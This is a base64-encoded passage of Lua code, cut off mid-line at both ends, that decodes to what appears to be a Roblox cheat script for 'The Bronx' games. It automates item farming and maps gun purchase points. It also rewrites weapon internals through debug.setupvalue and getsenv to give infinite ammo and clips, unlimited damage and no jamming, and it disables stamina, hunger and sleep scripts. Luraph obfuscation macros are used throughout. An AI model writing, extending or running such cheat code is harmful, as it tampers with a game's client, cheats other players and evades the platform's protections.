CAgICAgICAgICAgICAgIHRwX2RlYm91bmNlID0gZmFsc2UKCiAgICAgICAgICAgICAgICBpZiBDb25maWcuU291dGhfQnJvbnguRmFybWluZ1V0aWxpdGllcy5DYXJkRmFybSB0aGVuCiAgICAgICAgICAgICAgICAgICAgU3RvcF9DYXJkRmFybSgpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEwKQogICAgICAgICAgICAgICAgICAgIFN0YXJ0X0NhcmRGYXJtKCkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIENvbmZpZy5Tb3V0aF9Ccm9ueC5GYXJtaW5nVXRpbGl0aWVzLkJveEZhcm0gdGhlbgogICAgICAgICAgICAgICAgICAgIFN0b3BfQm94RmFybSgpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEwKQogICAgICAgICAgICAgICAgICAgIFN0YXJ0X0JveEZhcm0oKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgQ29uZmlnLlNvdXRoX0Jyb254LkZhcm1pbmdVdGlsaXRpZXMuQ2hpcEZhcm0gdGhlbgogICAgICAgICAgICAgICAgICAgIFN0b3BfQ2hpcEZhcm0oKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxMCkKICAgICAgICAgICAgICAgICAgICBTdGFydF9DaGlwRmFybSgpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBDb25maWcuU291dGhfQnJvbnguRmFybWluZ1V0aWxpdGllcy5NYXJzaG1hbGxvd0Zhcm0gdGhlbgogICAgICAgICAgICAgICAgICAgIFN0b3BfTWFyc2htYWxsb3dGYXJtKCkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMTApCiAgICAgICAgICAgICAgICAgICAgU3RhcnRfTWFyc2htYWxsb3dGYXJtKCkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIEh1bWFub2lkLkRpZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLlNvdXRoX0Jyb254LkZhcm1pbmdVdGlsaXRpZXMuQ2FyZEZhcm0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBTdG9wX0NhcmRGYXJtKCkKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLlNvdXRoX0Jyb254LkZhcm1pbmdVdGlsaXRpZXMuQm94RmFybSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFN0b3BfQm94RmFybSgpCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5Tb3V0aF9Ccm9ueC5GYXJtaW5nVXRpbGl0aWVzLkNoaXBGYXJtIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgU3RvcF9DaGlwRmFybSgpCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5Tb3V0aF9Ccm9ueC5GYXJtaW5nVXRpbGl0aWVzLk1hcnNobWFsbG93RmFybSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFN0b3BfTWFyc2htYWxsb3dGYXJtKCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgaWYgV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJQcm9tcHRQdXJjaGFzZXMiKSB0aGVuCiAgICAgICAgICAgICAgICBHdW5Qb3NpdGlvbiA9IHt9CgogICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBSZXBsaWNhdGVkU3RvcmFnZS5Xb3Jrc3BhY2UuUHJvbXB0UHVyY2hhc2VzOkdldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZTpJc0EoIk1vZGVsIikgYW5kIG5vdCBXb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIlByb21wdFB1cmNoYXNlcyIpOkZpbmRGaXJzdENoaWxkKFZhbHVlLk5hbWUpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgVmFsdWUuUGFyZW50ID0gV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJQcm9tcHRQdXJjaGFzZXMiKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBXb3Jrc3BhY2UuUHJvbXB0UHVyY2hhc2VzOkdldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBub3QgVmFsdWU6RmluZEZpcnN0Q2hpbGQoIlByaWNlIikgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBub3QgVmFsdWU6RmluZEZpcnN0Q2hpbGQoInByb3hwcm9tcHQiKSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBWYWx1ZTpGaW5kRmlyc3RDaGlsZCgicHJveHByb21wdCIpOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiUHJveGltaXR5UHJvbXB0IikgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgR3VuV2l0aFByaWNlID0gc3RyaW5nLmZvcm1hdCgiJXMgLSAkJXMiLCB0b3N0cmluZyhWYWx1ZSksIHRvc3RyaW5nKFZhbHVlLlByaWNlLlZhbHVlKSkKICAgICAgICAgICAgICAgICAgICBpZiBub3QgdGFibGUuZmluZChDb25maWcuU291dGhfQnJvbnguR3VucywgR3VuV2l0aFByaWNlKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChDb25maWcuU291dGhfQnJvbnguR3VucywgR3VuV2l0aFByaWNlKQoKICAgICAgICAgICAgICAgICAgICAgICAgR3VuUG9zaXRpb25bVmFsdWUuTmFtZV0gPSBWYWx1ZS5wcm94cHJvbXB0LkNGcmFtZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgdGFibGUuc29ydChDb25maWcuU291dGhfQnJvbnguR3VucykKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIGlmIEdhbWVfTmFtZSA9PSAiVGhlIEJyb254IiB0aGVuCiAgICAgICAgICAgIFJlcXVpcmVTdXBwb3J0ID0gdHlwZShzZWxlY3QoMiwgcGNhbGwocmVxdWlyZSwgU2VydmljZXMuUmVwbGljYXRlZFN0b3JhZ2UuQmxhY2tsaXN0ZWRNYXJrZXRUb29scykpKSA9PSAidGFibGUiCiAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgIGlmIEdhbWVfTmFtZSA9PSAiVGhlIEJyb254IiBhbmQgUmVxdWlyZVN1cHBvcnQgdGhlbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBPbGRXZWFwb25WYWx1ZXMgPSB7fQoKICAgICAgICAgICAgbG9jYWwgR2V0QWxsVG9vbHMgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihMb2NhbFRvb2xzT25seSkKICAgICAgICAgICAgICAgIGxvY2FsIFJlc3VsdCA9IHt9CiAgICAKICAgICAgICAgICAgICAgIGZvciBfLCBWYWx1ZSBpbiBuZXh0LCB7bm90IExvY2FsVG9vbHNPbmx5IGFuZCBMaWdodGluZywgTG9jYWxQbGF5ZXIuQmFja3BhY2ssIExvY2FsUGxheWVyLkNoYXJhY3RlciB+PSBuaWwgYW5kIExvY2FsUGxheWVyLkNoYXJhY3Rlcn0gZG8KICAgICAgICAgICAgICAgICAgICBpZiB0eXBlKFZhbHVlKSA9PSAidXNlcmRhdGEiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIF9WYWx1ZSBpbiBuZXh0LCBWYWx1ZTpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLWlmIF9WYWx1ZS5OYW1lID09ICJUUDlFbGl0ZVRhbiIgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlc3VsdFsjUmVzdWx0ICsgMV0gPSBfVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgIAogICAgICAgICAgICAgICAgcmV0dXJuIFJlc3VsdAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBsb2NhbCBHZXRQZXJjZW50YWdlID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oRGVmYXVsdFZhbHVlLCBOZXdWYWx1ZSkKICAgICAgICAgICAgICAgIE5ld1ZhbHVlID0gbWF0aC5tYXgoMCwgbWF0aC5taW4oMTAwLCBOZXdWYWx1ZSkpCgogICAgICAgICAgICAgICAgbG9jYWwgbmV3UmVjb2lsID0gRGVmYXVsdFZhbHVlICogKE5ld1ZhbHVlIC8gMTAwKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHJldHVybiBuZXdSZWNvaWwKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgbG9jYWwgTW9kV2VhcG9uID0gTFBIX0pJVF9NQVgoZnVuY3Rpb24oV2VhcG9uKQogICAgICAgICAgICAgICAgbG9jYWwgTW9kdWxlID0gV2VhcG9uOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiTW9kdWxlU2NyaXB0IikKICAgICAgICAgICAgICAgIGxvY2FsIE9sZENvbmZpZyA9IE9sZFdlYXBvblZhbHVlc1tXZWFwb24uTmFtZV0KICAgIAogICAgICAgICAgICAgICAgaWYgTW9kdWxlIGFuZCBNb2R1bGUuTmFtZSA9PSAiU2V0dGluZyIgdGhlbgogICAgICAgICAgICAgICAgICAgIE1vZHVsZSA9IHJlcXVpcmUoTW9kdWxlKQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgU2V0SW5maW5pdGVBbW1vID09IG5pbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgU2V0SW5maW5pdGVBbW1vID0gdHJ1ZQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgU2V0SW5maW5pdGVDbGlwcyA9PSBuaWwgdGhlbgogICAgICAgICAgICAgICAgICAgIFNldEluZmluaXRlQ2xpcHMgPSB0cnVlCiAgICAgICAgICAgICAgICBlbmQKCmlmIENvbmZpZy5UaGVCcm9ueC5fTW9kaWZpY2F0aW9ucy5JbmZpbml0ZUNsaXBzIHRoZW4KICAgIGRlYnVnLnNldHVwdmFsdWUoCiAgICAgICAgZ2V0c2VudihXZWFwb246RmluZEZpcnN0Q2hpbGQoIkd1blNjcmlwdF9Mb2NhbCIpKS5SZWxvYWQsCiAgICAgICAgMywKICAgICAgICAxMDAwMCAKICAgICkKCiAgICBTZXRJbmZpbml0ZUNsaXBzID0gdHJ1ZQplbmQKCmlmIENvbmZpZy5UaGVCcm9ueC5fTW9kaWZpY2F0aW9ucy5JbmZpbml0ZUNsaXBzID09IGZhbHNlIGFuZCBTZXRJbmZpbml0ZUNsaXBzID09IHRydWUgdGhlbgogICAgZGVidWcuc2V0dXB2YWx1ZSgKICAgICAgICBnZXRzZW52KFdlYXBvbjpGaW5kRmlyc3RDaGlsZCgiR3VuU2NyaXB0X0xvY2FsIikpLlJlbG9hZCwKICAgICAgICAzLAogICAgICAgIE9sZENvbmZpZy5BbW1vUGVyTWFnCiAgICApCgogICAgU2V0SW5maW5pdGVDbGlwcyA9IGZhbHNlCmVuZAoKCiAgICAgICAgICAgICAgICBpZiBDb25maWcuVGhlQnJvbnguX01vZGlmaWNhdGlvbnMuSW5maW5pdGVBbW1vIHRoZW4KICAgICAgICAgICAgICAgICAgICBkZWJ1Zy5zZXR1cHZhbHVlKGdldHNlbnYoV2VhcG9uOkZpbmRGaXJzdENoaWxkKCJHdW5TY3JpcHRfTG9jYWwiKSkuUmVsb2FkLCAxLCBDb25maWcuVGhlQnJvbnguX01vZGlmaWNhdGlvbnMuSW5maW5pdGVBbW1vIGFuZCAxZTEgb3IgT2xkQ29uZmlnLkFtbW9QZXJNYWcgLyAxKQogICAgICAgICAgICAgICAgICAgIFNldEluZmluaXRlQW1tbyA9IHRydWUKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIENvbmZpZy5UaGVCcm9ueC5fTW9kaWZpY2F0aW9ucy5JbmZpbml0ZUFtbW8gPT0gZmFsc2UgYW5kIFNldEluZmluaXRlQW1tbyA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZGVidWcuc2V0dXB2YWx1ZShnZXRzZW52KFdlYXBvbjpGaW5kRmlyc3RDaGlsZCgiR3VuU2NyaXB0X0xvY2FsIikpLlJlbG9hZCwgMSwgT2xkQ29uZmlnLkFtbW9QZXJNYWcpCgogICAgICAgICAgICAgICAgICAgIFNldEluZmluaXRlQW1tbyA9IGZhbHNlCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBNb2R1bGUuTGltaXRlZEFtbW9FbmFibGVkID0gZmFsc2UKCiAgICAgICAgICAgICAgICBNb2R1bGUuRmlyZVJhdGUgPSBDb25maWcuVGhlQnJvbnguX01vZGlmaWNhdGlvbnMuTW9kaWZ5RmlyZVJhdGUgYW5kIEdldFBlcmNlbnRhZ2UoT2xkQ29uZmlnLkZpcmVSYXRlLCBDb25maWcuVGhlQnJvbnguX01vZGlmaWNhdGlvbnMuRmlyZVJhdGVTcGVlZCkgb3IgT2xkQ29uZmlnLkZpcmVSYXRlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIE1vZHVsZS5SZWxvYWRUaW1lID0gQ29uZmlnLlRoZUJyb254Ll9Nb2RpZmljYXRpb25zLk1vZGlmeVJlbG9hZFNwZWVkIGFuZCBHZXRQZXJjZW50YWdlKE9sZENvbmZpZy5SZWxvYWRUaW1lLCBDb25maWcuVGhlQnJvbnguX01vZGlmaWNhdGlvbnMuUmVsb2FkU3BlZWQpIG9yIE9sZENvbmZpZy5SZWxvYWRUaW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBNb2R1bGUuU3ByZWFkWFkgdGhlbgogICAgICAgICAgICAgICAgICAgIE1vZHVsZS5TcHJlYWRYWSA9IENvbmZpZy5UaGVCcm9ueC5fTW9kaWZpY2F0aW9ucy5Nb2RpZnlTcHJlYWRWYWx1ZSBhbmQgR2V0UGVyY2VudGFnZShPbGRDb25maWcuU3ByZWFkWFksIENvbmZpZy5UaGVCcm9ueC5fTW9kaWZpY2F0aW9ucy5TcHJlYWRQZXJjZW50YWdlKSBvciBPbGRDb25maWcuU3ByZWFkWFkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIE1vZHVsZS5TcHJlYWRZWCB0aGVuCiAgICAgICAgICAgICAgICAgICAgTW9kdWxlLlNwcmVhZFlYID0gQ29uZmlnLlRoZUJyb254Ll9Nb2RpZmljYXRpb25zLk1vZGlmeVNwcmVhZFZhbHVlIGFuZCBHZXRQZXJjZW50YWdlKE9sZENvbmZpZy5TcHJlYWRZWCwgQ29uZmlnLlRoZUJyb254Ll9Nb2RpZmljYXRpb25zLlNwcmVhZFBlcmNlbnRhZ2UpIG9yIE9sZENvbmZpZy5TcHJlYWRZWAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgTW9kdWxlLlNwcmVhZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgTW9kdWxlLlNwcmVhZCA9IENvbmZpZy5UaGVCcm9ueC5fTW9kaWZpY2F0aW9ucy5Nb2RpZnlTcHJlYWRWYWx1ZSBhbmQgR2V0UGVyY2VudGFnZShPbGRDb25maWcuU3ByZWFkLCBDb25maWcuVGhlQnJvbnguX01vZGlmaWNhdGlvbnMuU3ByZWFkUGVyY2VudGFnZSkgb3IgT2xkQ29uZmlnLlNwcmVhZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgTW9kdWxlLlNwcmVhZFggPSBDb25maWcuVGhlQnJvbnguX01vZGlmaWNhdGlvbnMuTW9kaWZ5U3ByZWFkVmFsdWUgYW5kIEdldFBlcmNlbnRhZ2UoT2xkQ29uZmlnLlNwcmVhZFgsIENvbmZpZy5UaGVCcm9ueC5fTW9kaWZpY2F0aW9ucy5TcHJlYWRQZXJjZW50YWdlKSBvciBPbGRDb25maWcuU3ByZWFkWAogICAgICAgICAgICAgICAgTW9kdWxlLlNwcmVhZFkgPSBDb25maWcuVGhlQnJvbnguX01vZGlmaWNhdGlvbnMuTW9kaWZ5U3ByZWFkVmFsdWUgYW5kIEdldFBlcmNlbnRhZ2UoT2xkQ29uZmlnLlNwcmVhZFksIENvbmZpZy5UaGVCcm9ueC5fTW9kaWZpY2F0aW9ucy5TcHJlYWRQZXJjZW50YWdlKSBvciBPbGRDb25maWcuU3ByZWFkWQoKICAgICAgICAgICAgICAgIE1vZHVsZS5SZWNvaWwgPSBDb25maWcuVGhlQnJvbnguX01vZGlmaWNhdGlvbnMuTW9kaWZ5UmVjb2lsVmFsdWUgYW5kIEdldFBlcmNlbnRhZ2UoT2xkQ29uZmlnLlJlY29pbCwgQ29uZmlnLlRoZUJyb254Ll9Nb2RpZmljYXRpb25zLlJlY29pbFBlcmNlbnRhZ2UpIG9yIE9sZENvbmZpZy5SZWNvaWwKCiAgICAgICAgICAgICAgICBNb2R1bGUuQmFzZURhbWFnZSA9IENvbmZpZy5UaGVCcm9ueC5fTW9kaWZpY2F0aW9ucy5JbmZpbml0ZURhbWFnZSBhbmQgbWF0aC5odWdlIG9yIE9sZENvbmZpZy5CYXNlRGFtYWdlCgogICAgICAgICAgICAgICAgTW9kdWxlLkF1dG8gPSBDb25maWcuVGhlQnJvbnguX01vZGlmaWNhdGlvbnMuQXV0b21hdGljIG9yIE9sZENvbmZpZy5BdXRvCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgTW9kdWxlLkphbUNoYW5jZSA9IENvbmZpZy5UaGVCcm9ueC5fTW9kaWZpY2F0aW9ucy5EaXNhYmxlSmFtbWluZyBhbmQgMCBvciBPbGRDb25maWcuSmFtQ2hhbmNlCiAgICAKICAgICAgICAgICAgICAgIE1vZHVsZS5BdXRvID0gQ29uZmlnLlRoZUJyb254Ll9Nb2RpZmljYXRpb25zLkF1dG9tYXRpYyBvciBPbGRDb25maWcuQXV0bwogICAgICAgIAogICAgICAgICAgICAgICAgTW9kdWxlLkVxdWlwVGltZSA9IENvbmZpZy5UaGVCcm9ueC5fTW9kaWZpY2F0aW9ucy5Nb2RpZnlFcXVpcFNwZWVkIGFuZCBHZXRQZXJjZW50YWdlKE9sZENvbmZpZy5FcXVpcFRpbWUsIENvbmZpZy5UaGVCcm9ueC5fTW9kaWZpY2F0aW9ucy5FcXVpcFNwZWVkKSBvciBPbGRDb25maWcuRXF1aXBUaW1lCgogICAgICAgICAgICAgICAgTW9kdWxlLkphbUNoYW5jZSA9IENvbmZpZy5UaGVCcm9ueC5fTW9kaWZpY2F0aW9ucy5Ob0phbSBhbmQgMCBvciBPbGRDb25maWcuSmFtQ2hhbmNlCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGxvY2FsIE1vZFdlYXBvbnMgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBmb3IgXywgV2VhcG9uIGluIG5leHQsIEdldEFsbFRvb2xzKHRydWUpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgV2VhcG9uOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgTW9kV2VhcG9uKFdlYXBvbikKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBsb2NhbCBTZXRWYWx1ZXMgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBmb3IgXywgV2VhcG9uIGluIG5leHQsIEdldEFsbFRvb2xzKCkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBXZWFwb246SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBNb2R1bGUgPSBXZWFwb246RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJNb2R1bGVTY3JpcHQiKQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgTW9kdWxlIGFuZCBNb2R1bGUuTmFtZSA9PSAiU2V0dGluZyIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgTW9kdWxlID0gcmVxdWlyZShNb2R1bGUpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdHlwZShNb2R1bGUpID09ICJ0YWJsZSIgYW5kIG5vdCBPbGRXZWFwb25WYWx1ZXNbV2VhcG9uLk5hbWVdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9sZFdlYXBvblZhbHVlc1tXZWFwb24uTmFtZV0gPSB7fQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIE9sZENvbmZpZyA9IE9sZFdlYXBvblZhbHVlc1tXZWFwb24uTmFtZV0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIG5leHQsIE1vZHVsZSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9sZENvbmZpZ1tJbmRleF0gPSBWYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbiBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkgZW5kCgogICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuQ2hpbGRBZGRlZDpDb25uZWN0KExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKFZhbHVlKQogICAgICAgICAgICAgICAgaWYgbm90IFZhbHVlOklzQSgiVG9vbCIpIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICAgICAgICAgIFNldFZhbHVlcygpCgogICAgICAgICAgICAgICAgTW9kV2VhcG9uKFZhbHVlKTsKICAgICAgICAgICAgZW5kKSkKCiAgICAgICAgICAgIExvY2FsUGxheWVyLkJhY2twYWNrLkNoaWxkQWRkZWQ6Q29ubmVjdChMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihWYWx1ZSkKICAgICAgICAgICAgICAgIGlmIG5vdCBWYWx1ZTpJc0EoIlRvb2wiKSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgU2V0VmFsdWVzKCkKCiAgICAgICAgICAgICAgICBNb2RXZWFwb24oVmFsdWUpOwogICAgICAgICAgICBlbmQpKQoKICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihDaGFyYWN0ZXIpCiAgICAgICAgICAgICAgICBDaGFyYWN0ZXIuQ2hpbGRBZGRlZDpDb25uZWN0KExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKFZhbHVlKQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBWYWx1ZTpJc0EoIlRvb2wiKSB0aGVuIHJldHVybiBlbmQKICAgIAogICAgICAgICAgICAgICAgICAgIFNldFZhbHVlcygpCgogICAgICAgICAgICAgICAgICAgIE1vZFdlYXBvbihWYWx1ZSk7CiAgICAgICAgICAgICAgICBlbmQpKQogICAgCiAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5CYWNrcGFjay5DaGlsZEFkZGVkOkNvbm5lY3QoTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IFZhbHVlOklzQSgiVG9vbCIpIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBTZXRWYWx1ZXMoKQoKICAgICAgICAgICAgICAgICAgICBNb2RXZWFwb24oVmFsdWUpOwogICAgICAgICAgICAgICAgZW5kKSkKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgbG9jYWwgQ29uZmlnTWV0YXRhYmxlID0gZ2V0bWV0YXRhYmxlKENvbmZpZy5UaGVCcm9ueC5Nb2RpZmljYXRpb25zKQoKICAgICAgICAgICAgQ29uZmlnTWV0YXRhYmxlLl9faW5kZXggPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbiguLi4pCiAgICAgICAgICAgICAgICByZXR1cm4gQ29uZmlnLlRoZUJyb254Ll9Nb2RpZmljYXRpb25zW3NlbGVjdCgyLCAuLi4pXQogICAgICAgICAgICBlbmQpCiAgICAKICAgICAgICAgICAgQ29uZmlnTWV0YXRhYmxlLl9fbmV3aW5kZXggPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbiguLi4pCiAgICAgICAgICAgICAgICBsb2NhbCBJbmRleCwgVmFsdWUgPSBzZWxlY3QoMiwgLi4uKQogICAgCiAgICAgICAgICAgICAgICBDb25maWcuVGhlQnJvbnguX01vZGlmaWNhdGlvbnNbSW5kZXhdID0gVmFsdWU7IE1vZFdlYXBvbnMoKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCgogICAgICAgIGlmIEdhbWVfTmFtZSA9PSAiVGhlIEJyb254IiB0aGVuCiAgICAgICAgICAgIFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLlBsYXllckd1aTpGaW5kRmlyc3RDaGlsZCgiUnVuIikgYW5kIExvY2FsUGxheWVyLlBsYXllckd1aS5SdW46RmluZEZpcnN0Q2hpbGQoIlN0YW1pbmFCYXJTY3JpcHQiLCB0cnVlKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuUGxheWVyR3VpLlJ1bjpGaW5kRmlyc3RDaGlsZCgiU3RhbWluYUJhclNjcmlwdCIsIHRydWUpLkRpc2FibGVkID0gQ29uZmlnLlRoZUJyb254LlBsYXllck1vZGlmaWNhdGlvbnMuSW5maW5pdGVTdGFtaW5hCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBMb2NhbFBsYXllci5QbGF5ZXJHdWk6RmluZEZpcnN0Q2hpbGQoIkh1bmdlciIpIGFuZCBMb2NhbFBsYXllci5QbGF5ZXJHdWkuSHVuZ2VyOkZpbmRGaXJzdENoaWxkKCJIdW5nZXJCYXJTY3JpcHQiLCB0cnVlKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuUGxheWVyR3VpLkh1bmdlcjpGaW5kRmlyc3RDaGlsZCgiSHVuZ2VyQmFyU2NyaXB0IiwgdHJ1ZSkuRGlzYWJsZWQgPSBDb25maWcuVGhlQnJvbnguUGxheWVyTW9kaWZpY2F0aW9ucy5JbmZpbml0ZUh1bmdlcgogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgTG9jYWxQbGF5ZXIuUGxheWVyR3VpOkZpbmRGaXJzdENoaWxkKCJTbGVlcEd1aSIpIGFuZCBMb2NhbFBsYXllci5QbGF5ZXJHdWkuU2xlZXBHdWk6RmluZEZpcnN0Q2hpbGQoInNsZWVwU2NyaXB0IiwgdHJ1ZSkgdGhlbgogICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLlBsYXllckd1aS5TbGVlcEd1aTpGaW5kRmlyc3RDaGlsZCgic2xlZXBTY3JpcHQiLCB0cnVlKS5EaXNhYmxlZCA9IENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJNb2RpZmljYXRpb25zLkluZmluaXRlU2xlZXAKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJDYW1lcmFCb2JiaW5nIikgdGhlbgogICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhQm9iYmluZyIpLkRpc2FibGVkID0gQ29uZmlnLlRoZUJyb254LlBsYXllck1vZGlmaWNhdGlvbnMuRGlzYWJsZUNhbWVyYUJvYmJpbmcKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJGYWxsRGFtYWdlUmFnZG9sbCIpIHRoZW4KICAgICAgI